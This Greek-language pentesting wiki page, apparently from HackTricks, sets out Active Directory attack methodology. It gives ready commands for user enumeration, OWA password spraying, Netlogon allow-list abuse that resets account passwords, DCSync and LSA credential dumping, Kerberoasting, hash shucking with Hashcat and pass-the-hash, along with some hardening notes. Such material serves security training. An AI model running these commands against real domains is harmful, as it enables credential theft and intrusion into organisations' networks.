# Μεθοδολογία Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Βασική επισκόπηση

Το **Active Directory** λειτουργεί ως θεμελιώδης τεχνολογία, επιτρέποντας στους **διαχειριστές δικτύου** να δημιουργούν και να διαχειρίζονται αποτελεσματικά **domains**, **χρήστες** και **αντικείμενα** μέσα σε ένα δίκτυο. Είναι σχεδιασμένο ώστε να κλιμακώνεται, διευκολύνοντας την οργάνωση μεγάλου αριθμού χρηστών σε διαχειρίσιμες **ομάδες** και **υποομάδες**, ενώ ελέγχει τα **δικαιώματα πρόσβασης** σε διάφορα επίπεδα.

Η δομή του **Active Directory** αποτελείται από τρία κύρια επίπεδα: **domains**, **trees** και **forests**. Ένα **domain** περιλαμβάνει μια συλλογή αντικειμένων, όπως **χρήστες** ή **συσκευές**, που χρησιμοποιούν κοινή βάση δεδομένων. Τα **trees** είναι ομάδες αυτών των domains που συνδέονται μέσω μιας κοινής δομής, ενώ ένα **forest** αντιπροσωπεύει τη συλλογή πολλών trees, τα οποία διασυνδέονται μέσω **σχέσεων εμπιστοσύνης**, σχηματίζοντας το ανώτατο επίπεδο της οργανωτικής δομής. Συγκεκριμένα **δικαιώματα πρόσβασης** και **επικοινωνίας** μπορούν να οριστούν σε καθένα από αυτά τα επίπεδα.

Οι βασικές έννοιες του **Active Directory** περιλαμβάνουν:

1. **Κατάλογος** – Περιέχει όλες τις πληροφορίες που αφορούν τα αντικείμενα του Active Directory.
2. **Αντικείμενο** – Αναφέρεται σε οντότητες μέσα στον κατάλογο, όπως **χρήστες**, **ομάδες** ή **κοινόχρηστοι φάκελοι**.
3. **Domain** – Λειτουργεί ως container για αντικείμενα καταλόγου, με τη δυνατότητα να συνυπάρχουν πολλά domains μέσα σε ένα **forest**, καθένα από τα οποία διατηρεί τη δική του συλλογή αντικειμένων.
4. **Tree** – Μια ομάδα domains που μοιράζονται ένα κοινό root domain.
5. **Forest** – Το ανώτατο επίπεδο οργανωτικής δομής στο Active Directory, αποτελούμενο από πολλά trees με **σχέσεις εμπιστοσύνης** μεταξύ τους.

Το **Active Directory Domain Services (AD DS)** περιλαμβάνει μια σειρά υπηρεσιών κρίσιμων για την κεντρική διαχείριση και επικοινωνία μέσα σε ένα δίκτυο. Αυτές οι υπηρεσίες περιλαμβάνουν:

1. **Domain Services** – Συγκεντρώνει την αποθήκευση δεδομένων και διαχειρίζεται τις αλληλεπιδράσεις μεταξύ **χρηστών** και **domains**, συμπεριλαμβανομένων των λειτουργιών **authentication** και **search**.
2. **Certificate Services** – Επιβλέπει τη δημιουργία, διανομή και διαχείριση ασφαλών **digital certificates**.
3. **Lightweight Directory Services** – Υποστηρίζει εφαρμογές που χρησιμοποιούν καταλόγους μέσω του **LDAP protocol**.
4. **Directory Federation Services** – Παρέχει δυνατότητες **single-sign-on** για την authentication χρηστών σε πολλές web εφαρμογές μέσα σε μία συνεδρία.
5. **Rights Management** – Συμβάλλει στην προστασία υλικού που καλύπτεται από copyright, ρυθμίζοντας τη μη εξουσιοδοτημένη διανομή και χρήση του.
6. **DNS Service** – Είναι κρίσιμη για την επίλυση **domain names**.

Για μια πιο λεπτομερή επεξήγηση, δείτε: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Για να μάθετε πώς να **επιτεθείτε σε ένα AD**, χρειάζεται να **κατανοείτε** πολύ καλά τη **διαδικασία authentication του Kerberos**.\
[**Διαβάστε αυτή τη σελίδα αν δεν γνωρίζετε ακόμη πώς λειτουργεί.**](kerberos-authentication.md)

## Cheat Sheet

Μπορείτε να επισκεφθείτε το [https://wadcoms.github.io/](https://wadcoms.github.io) για μια γρήγορη επισκόπηση των commands που μπορείτε να εκτελέσετε για να κάνετε enumerate/exploit ένα AD.

> [!WARNING]
> Η επικοινωνία Kerberos συνήθως **απαιτεί ένα πλήρως προσδιορισμένο domain name (FQDN)**, ώστε ο client να μπορεί να λάβει ticket για το σωστό SPN. Η πρόσβαση σε ένα μηχάνημα μέσω IP address συνήθως κάνει fallback σε NTLM αντί για Kerberos.

## Recon Active Directory (No creds/sessions)

Αν έχετε απλώς πρόσβαση σε ένα περιβάλλον AD, αλλά δεν έχετε credentials/sessions, μπορείτε να:

- **Κάνετε Pentest στο δίκτυο:**
- Κάνετε scan στο δίκτυο, να εντοπίσετε μηχανήματα και ανοιχτές ports και να προσπαθήσετε να **εκμεταλλευτείτε vulnerabilities** ή να **εξαγάγετε credentials** από αυτά (για παράδειγμα, [οι printers μπορεί να είναι πολύ ενδιαφέροντες στόχοι](ad-information-in-printers.md)).
- Το DNS enumeration μπορεί να παρέχει πληροφορίες για βασικούς servers στο domain, όπως web, printers, shares, vpn, media κ.λπ.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Δείτε τη γενική [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) για περισσότερες πληροφορίες σχετικά με το πώς να το κάνετε αυτό.
- **Ελέγξτε για null και Guest access σε smb services** (αυτό δεν θα λειτουργήσει σε σύγχρονες εκδόσεις Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Ένας πιο λεπτομερής οδηγός σχετικά με το πώς να κάνετε enumeration σε έναν SMB server βρίσκεται εδώ:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Κάντε enumerate το Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Ένας πιο λεπτομερής οδηγός σχετικά με το πώς να κάνετε enumeration στο LDAP βρίσκεται εδώ (δώστε **ιδιαίτερη προσοχή στην anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Κάντε poison το δίκτυο**
- Συλλέξτε credentials [**κάνοντας impersonate services με το Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Αποκτήστε πρόσβαση σε host [**κάνοντας abuse το relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Συλλέξτε credentials **εκθέτοντας** [**fake UPnP services με evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Εξαγάγετε usernames/names από internal documents, social media και services (κυρίως web) μέσα στα domain environments, καθώς και από δημόσια διαθέσιμες πηγές.
- Αν βρείτε τα πλήρη ονόματα των εργαζομένων μιας εταιρείας, μπορείτε να δοκιμάσετε διαφορετικά AD **username conventions (**[**διαβάστε αυτό**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Οι πιο συνηθισμένες conventions είναι: _NameSurname_, _Name.Surname_, _NamSur_ (3letters από το καθένα), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _τυχαία γράμματα και 3 τυχαίοι αριθμοί_ (abc123).
- Εργαλεία:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Ελέγξτε τις σελίδες [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) και [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Όταν ζητείται ένα **μη έγκυρο username**, ο server απαντά χρησιμοποιώντας τον **κωδικό σφάλματος Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, επιτρέποντάς μας να προσδιορίσουμε ότι το username δεν ήταν έγκυρο. Τα **έγκυρα usernames** θα προκαλέσουν είτε την επιστροφή του **TGT** σε απόκριση AS-REP είτε το σφάλμα _KRB5KDC_ERR_PREAUTH_REQUIRED_, το οποίο υποδεικνύει ότι ο χρήστης πρέπει να εκτελέσει pre-authentication.
- **No Authentication against MS-NRPC**: Χρήση του auth-level = 1 (No authentication) απέναντι στο interface MS-NRPC (Netlogon) των domain controllers. Η μέθοδος καλεί τη συνάρτηση `DsrGetDcNameEx2` μετά το binding στο interface MS-NRPC, για να ελέγξει αν υπάρχει ο χρήστης ή ο υπολογιστής χωρίς credentials. Το εργαλείο [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) υλοποιεί αυτόν τον τύπο enumeration. Η έρευνα βρίσκεται [εδώ](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **Διακομιστής OWA (Outlook Web Access)**

Αν βρείτε έναν από αυτούς τους διακομιστές στο network, μπορείτε επίσης να πραγματοποιήσετε **user enumeration against it**. Για παράδειγμα, μπορείτε να χρησιμοποιήσετε το tool [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Μπορείτε να βρείτε λίστες με usernames σε [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) και σε αυτό ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Ωστόσο, θα πρέπει να έχετε τα **ονόματα των ατόμων που εργάζονται στην εταιρεία** από το recon step που θα έπρεπε να έχετε πραγματοποιήσει πριν από αυτό. Με το όνομα και το επώνυμο, θα μπορούσατε να χρησιμοποιήσετε το script [**namemash.py**](https://gist.github.com/superkojiman/11076951) για να δημιουργήσετε πιθανά έγκυρα usernames.

### Abuse του allow-list ευάλωτου καναλιού Netlogon (Onelogon)

Ακόμη και μετά την εφαρμογή patch για το **Zerologon** στον DC, οι λογαριασμοί που έχουν προστεθεί ρητά στο allow-list μπορεί να παραμένουν εκτεθειμένοι σε **legacy/vulnerable Netlogon secure-channel behavior**. Η επικίνδυνη ρύθμιση είναι το GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ή η αντίστοιχη registry value **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Αυτή η value είναι ένα **SDDL security descriptor** (δείτε [Security Descriptors](security-descriptors.md)). Οποιοσδήποτε account ή group έχει λάβει το σχετικό ACE στο DACL μπορεί να αποτελέσει στόχο. Για παράδειγμα, το `O:BAG:BAD:(A;;RC;;;WD)` ουσιαστικά προσθέτει στο allow-list το **Everyone**.

Πρακτικό workflow operator:

1. **Εντοπίστε τους principals στο allow-list** ελέγχοντας τόσο το **SYSVOL/GPO** όσο και το **live DC registry**.
2. **Επιλύστε τα SIDs** που βρίσκονται στο SDDL σε πραγματικούς AD users/computers και δώστε προτεραιότητα σε **DC machine accounts**, **trust accounts** και άλλα privileged machines.
3. Επιχειρήστε επανειλημμένα **MS-NRPC / Netlogon authentication** ως ο account που βρίσκεται στο allow-list.
4. Μετά από μια επιτυχημένη προσπάθεια, κάντε abuse στο **Netlogon password-setting** για να επαναφέρετε το password του target account (το public PoC το ορίζει σε κενό string).<sup>[[9]](#references)[[10]](#references)</sup>

Γρήγορα παραδείγματα triage / lab από το public artifact:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Σημειώσεις:

- Ο **scanner** είναι χρήσιμος επειδή η effective allow-list μπορεί να βρίσκεται στο **SYSVOL**, στο **registry** ή και στα δύο.
- Το exploit path είναι σημαντικό επειδή **δεν απαιτεί δικαιώματα Domain Admin** αφού εντοπιστεί ένας ευάλωτος λογαριασμός.
- Η παραβίαση ενός **Domain Controller machine account**, όπως το `DC$`, είναι ιδιαίτερα επικίνδυνη, επειδή το reset του password μπορεί να ενεργοποιήσει άμεσα ευρύτερα paths για **AD takeover**.
- Η **feasibility του brute force** εξαρτάται από το mode: το public artifact περιγράφει μια προσέγγιση meet-in-the-middle, ένα **24-bit** brute force όταν υπάρχει διαθέσιμος άλλος computer account και πιο αργές παραλλαγές **32-bit**.

Σημειώσεις για detection / hardening:

- Ελέγξτε την allow-list policy και αφαιρέστε οτιδήποτε εκτός από προσωρινές, ρητά απαιτούμενες εξαιρέσεις συμβατότητας.
- Παρακολουθείτε τα **System** events **5827/5828/5829/5830/5831** των DC, για να εντοπίζετε ευάλωτες Netlogon connections που απορρίπτονται, εντοπίζονται ή επιτρέπονται ρητά από την policy.
- Αντιμετωπίστε τους λογαριασμούς στο `VulnerableChannelAllowList` ως **high-risk** μέχρι να αφαιρεθεί η legacy dependency.

### Γνωρίζοντας ένα ή περισσότερα usernames

Εντάξει, γνωρίζετε ήδη ένα έγκυρο username αλλά δεν έχετε passwords... Τότε δοκιμάστε:

- [**ASREPRoast**](asreproast.md): Αν ένας user **δεν έχει** το attribute _DONT_REQ_PREAUTH_, μπορείτε να **ζητήσετε ένα AS_REP message** για τον συγκεκριμένο user, το οποίο θα περιέχει δεδομένα κρυπτογραφημένα μέσω derivation του password του user.
- [**Password Spraying**](password-spraying.md): Ας δοκιμάσουμε τα πιο **common passwords** με καθέναν από τους users που εντοπίστηκαν· ίσως κάποιος user χρησιμοποιεί ένα αδύναμο password (λάβετε υπόψη την password policy!).
- Σημειώστε ότι μπορείτε επίσης να κάνετε **spray σε OWA servers** για να προσπαθήσετε να αποκτήσετε πρόσβαση στους mail servers των users.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Ίσως μπορέσετε να **αποκτήσετε** κάποια challenge **hashes** κάνοντας **poisoning** σε ορισμένα protocols του **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Η enumeration του Active Directory παρέχει usernames, email identifiers και naming patterns, candidate hosts και services που μπορεί να εξαναγκαστούν να κάνουν authentication. Χρησιμοποιήστε αυτό το context για να εντοπίσετε βιώσιμα NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) και πιθανά paths προς το AD environment.

### Recon και relay posture checks με βάση το NetExec workspace

- Χρησιμοποιήστε **`nxcdb` workspaces** για να διατηρείτε την κατάσταση του AD recon ανά engagement: το `workspace create <name>` δημιουργεί SQLite DBs ανά protocol κάτω από `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Αλλάξτε views με `proto smb|mssql|winrm` και εμφανίστε τα gathered secrets με `creds`. Διαγράψτε χειροκίνητα τα sensitive data όταν ολοκληρώσετε: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Το γρήγορο subnet discovery με **`netexec smb <cidr>`** εμφανίζει το **domain**, το **OS build**, τις **SMB signing requirements** και το **Null Auth**. Τα members που εμφανίζουν `(signing:False)` είναι **relay-prone**, ενώ τα DCs συνήθως απαιτούν signing.
- Δημιουργήστε **hostnames στο /etc/hosts** απευθείας από το output του NetExec, ώστε να διευκολύνετε το targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Όταν το **SMB relay προς το DC είναι αποκλεισμένο** λόγω signing, ελέγξτε και την κατάσταση του **LDAP**: το `netexec ldap <dc>` επισημαίνει `(signing:None)` / weak channel binding. Ένα DC με υποχρεωτικό SMB signing αλλά απενεργοποιημένο LDAP signing παραμένει κατάλληλος στόχος για **relay-to-LDAP** abuses, όπως το **SPN-less RBCD**.

### Client-side printer credential leaks → μαζική επικύρωση domain credentials

- Τα printer/web UIs μερικές φορές **ενσωματώνουν masked admin passwords σε HTML**. Η προβολή του source/devtools μπορεί να αποκαλύψει cleartext (π.χ. `<input value="<password>">`), επιτρέποντας πρόσβαση με Basic-auth σε repositories σάρωσης/εκτύπωσης.
- Τα ανακτημένα print jobs ενδέχεται να περιέχουν **plaintext onboarding έγγραφα** με passwords ανά χρήστη. Διατηρήστε τις αντιστοιχίσεις ευθυγραμμισμένες κατά τις δοκιμές:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares** με τον **null ή guest user**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **πυροδοτήσουν ένα NTLM authentication εναντίον σας**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** και να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Το **Hash shucking** αντιμετωπίζει κάθε NT hash που διαθέτετε ήδη ως υποψήφιο password για άλλες, πιο αργές μορφές, των οποίων το key material παράγεται απευθείας από το NT hash. Αντί να κάνετε brute-force σε μεγάλες passphrases μέσα σε Kerberos RC4 tickets, NetNTLM challenges ή cached credentials, περνάτε τα NT hashes στα NT-candidate modes του Hashcat και το αφήνετε να επιβεβαιώσει την επαναχρησιμοποίηση password χωρίς να μάθετε ποτέ το plaintext. Αυτό είναι ιδιαίτερα ισχυρό μετά από domain compromise, όταν μπορείτε να συλλέξετε χιλιάδες τρέχοντα και ιστορικά NT hashes.<sup>[[5]](#references)</sup>

Χρησιμοποιήστε shucking όταν:

- Έχετε ένα NT corpus από DCSync, SAM/SECURITY dumps ή credential vaults και χρειάζεται να ελέγξετε αν επαναχρησιμοποιείται σε άλλα domains/forests.
- Συλλαμβάνετε Kerberos material βασισμένο σε RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses ή DCC/DCC2 blobs.
- Θέλετε να αποδείξετε γρήγορα την επαναχρησιμοποίηση μεγάλων, μη crackable passphrases και να κάνετε άμεσα pivot μέσω Pass-the-Hash.

Η τεχνική **δεν λειτουργεί** ενάντια σε encryption types των οποίων τα keys δεν είναι το NT hash (π.χ. Kerberos etype 17/18 AES). Αν ένα domain επιβάλλει AES-only, πρέπει να επιστρέψετε στα κανονικά password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Χρησιμοποιήστε το `secretsdump.py` με history για να πάρετε το μεγαλύτερο δυνατό σύνολο NT hashes (και τις προηγούμενες τιμές τους):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Οι καταχωρίσεις history διευρύνουν σημαντικά το candidate pool, επειδή η Microsoft μπορεί να αποθηκεύει έως και 24 προηγούμενα hashes ανά account. Για περισσότερους τρόπους συλλογής NTDS secrets δείτε:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – Το `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ή το Mimikatz `lsadump::sam /patch`) εξάγει τοπικά δεδομένα SAM/SECURITY και cached domain logons (DCC/DCC2). Αφαιρέστε τα διπλότυπα και προσθέστε αυτά τα hashes στην ίδια λίστα `nt_candidates.txt`.
- **Track metadata** – Διατηρήστε το username/domain που παρήγαγε κάθε hash (ακόμη και αν το wordlist περιέχει μόνο hex). Τα matching hashes σάς δείχνουν αμέσως ποιο principal επαναχρησιμοποιεί ένα password, μόλις το Hashcat εμφανίσει το winning candidate.
- Προτιμήστε candidates από το ίδιο forest ή από ένα trusted forest· έτσι μεγιστοποιείται η πιθανότητα overlap κατά το shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Σημειώσεις:

- Τα NT-candidate inputs **πρέπει να παραμένουν raw NT hashes των 32 hex χαρακτήρων**. Απενεργοποιήστε τα rule engines (χωρίς `-r` και χωρίς hybrid modes), επειδή το mangling καταστρέφει το candidate key material.
- Αυτά τα modes δεν είναι εγγενώς ταχύτερα, αλλά το NTLM keyspace (~30.000 MH/s σε ένα M3 Max) είναι περίπου 100× ταχύτερο από το Kerberos RC4 (~300 MH/s). Ο έλεγχος μιας επιλεγμένης λίστας NT είναι πολύ φθηνότερος από την εξερεύνηση ολόκληρου του password space στη slow format.
- Εκτελείτε πάντα το **τελευταίο Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`), επειδή τα modes 31500/31600/35300/35400 κυκλοφόρησαν πρόσφατα.<sup>[[7]](#references)</sup>
- Προς το παρόν δεν υπάρχει NT mode για AS-REQ Pre-Auth, ενώ τα AES etypes (19600/19700) απαιτούν το plaintext password, επειδή τα keys τους παράγονται μέσω PBKDF2 από passwords σε UTF-16LE και όχι από raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Συλλάβετε ένα RC4 TGS για ένα target SPN με έναν low-privileged user (δείτε τη σελίδα Kerberoast για λεπτομέρειες):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Κάντε shuck το ticket με τη NT λίστα σας:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Το Hashcat παράγει το RC4 key από κάθε NT candidate και επικυρώνει το `$krb5tgs$23$...` blob. Ένα match επιβεβαιώνει ότι το service account χρησιμοποιεί ένα από τα υπάρχοντα NT hashes σας.

3. Κάντε άμεσα pivot μέσω PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Προαιρετικά, μπορείτε αργότερα να ανακτήσετε το plaintext με `hashcat -m 1000 <matched_hash> wordlists/`, αν χρειάζεται.

#### Example – Cached credentials (mode 31600)

1. Κάντε dump τα cached logons από ένα compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Αντιγράψτε τη γραμμή DCC2 για τον ενδιαφέροντα domain user στο `dcc2_highpriv.txt` και κάντε shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Ένα επιτυχημένο match επιστρέφει το NT hash που είναι ήδη γνωστό στη λίστα σας, αποδεικνύοντας ότι ο cached user επαναχρησιμοποιεί ένα password. Χρησιμοποιήστε το απευθείας για PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ή κάντε brute-force σε fast NTLM mode για να ανακτήσετε το string.

Ακριβώς η ίδια διαδικασία εφαρμόζεται σε NetNTLM challenge-responses (`-m 27000/27100`) και DCC (`-m 31500`). Μόλις εντοπιστεί ένα match, μπορείτε να ξεκινήσετε relay, SMB/WMI/WinRM PtH ή να κάνετε re-crack το NT hash με masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Για αυτή τη φάση πρέπει να έχετε **κάνει compromise τα credentials ή ένα session ενός έγκυρου domain account**. Αν έχετε έγκυρα credentials ή shell ως domain user, **πρέπει να θυμάστε ότι οι επιλογές που αναφέρθηκαν προηγουμένως εξακολουθούν να αποτελούν επιλογές για το compromise άλλων users**.

Πριν ξεκινήσετε authenticated enumeration, κατανοήστε το **Kerberos double-hop problem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Το compromise ενός account αποτελεί **σημαντικό βήμα για την αξιολόγηση του domain**, επειδή επιτρέπει authenticated **Active Directory enumeration**:

Όσον αφορά το [**ASREPRoast**](asreproast.md), μπορείτε πλέον να εντοπίσετε κάθε πιθανό vulnerable user, ενώ όσον αφορά το [**Password Spraying**](password-spraying.md), μπορείτε να αποκτήσετε μια **λίστα με όλα τα usernames** και να δοκιμάσετε το password του compromised account, κενά passwords και νέα promising passwords.

- Μπορείτε να χρησιμοποιήσετε το [**CMD για basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Μπορείτε επίσης να χρησιμοποιήσετε [**powershell για recon**](../basic-powershell-for-pentesters/index.html), το οποίο θα είναι πιο stealthy
- Μπορείτε επίσης να [**χρησιμοποιήσετε το powerview**](../basic-powershell-for-pentesters/powerview.md) για την εξαγωγή πιο λεπτομερών πληροφοριών
- Ένα ακόμη εξαιρετικό tool για recon σε ένα active directory είναι το [**BloodHound**](bloodhound.md). **Δεν είναι ιδιαίτερα stealthy** (ανάλογα με τις collection methods που χρησιμοποιείτε), αλλά **αν δεν σας ενδιαφέρει**, πρέπει οπωσδήποτε να το δοκιμάσετε. Βρείτε πού μπορούν οι users να κάνουν RDP, βρείτε paths προς άλλα groups κ.λπ.
- **Άλλα automated AD enumeration tools είναι:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records του AD**](ad-dns-records.md), καθώς ενδέχεται να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **tool με GUI** που μπορείτε να χρησιμοποιήσετε για enumeration του directory είναι το **AdExplorer.exe** από το **SysInternal** Suite.
- Μπορείτε επίσης να κάνετε search στη LDAP database με το **ldapsearch**, για να αναζητήσετε credentials στα fields _userPassword_ και _unixUserPassword_, ή ακόμη και στο _Description_. Ανατρέξτε στο [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες methods.
- Αν χρησιμοποιείτε **Linux**, μπορείτε επίσης να κάνετε enumeration του domain με το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείτε επίσης να δοκιμάσετε automated tools όπως:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Είναι πολύ εύκολο να αποκτήσετε όλα τα domain usernames από τα Windows (`net user /domain`, `Get-DomainUser` ή `wmic useraccount get name,sid`). Στο Linux, μπορείτε να χρησιμοποιήσετε: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμη και αν αυτή η ενότητα Enumeration φαίνεται μικρή, αποτελεί το σημαντικότερο μέρος όλων. Ακολουθήστε τα links (κυρίως εκείνα για cmd, powershell, powerview και BloodHound), μάθετε πώς να κάνετε enumeration ενός domain και εξασκηθείτε μέχρι να αισθάνεστε άνετα. Κατά τη διάρκεια ενός assessment, αυτή θα είναι η κρίσιμη στιγμή για να βρείτε τον δρόμο σας προς DA ή να αποφασίσετε ότι δεν μπορεί να γίνει τίποτα.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από services συνδεδεμένα με user accounts και το cracking της κρυπτογράφησής τους — η οποία βασίζεται στα user passwords — **offline**.

Περισσότερα σχετικά με αυτό εδώ:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Μόλις αποκτήσετε κάποια credentials, μπορείτε να ελέγξετε αν έχετε πρόσβαση σε κάποιο **machine**. Για αυτόν τον σκοπό, μπορείτε να χρησιμοποιήσετε το **CrackMapExec** για να επιχειρήσετε connections σε πολλούς servers με διαφορετικά protocols, ανάλογα με τα port scans σας.

### Local Privilege Escalation

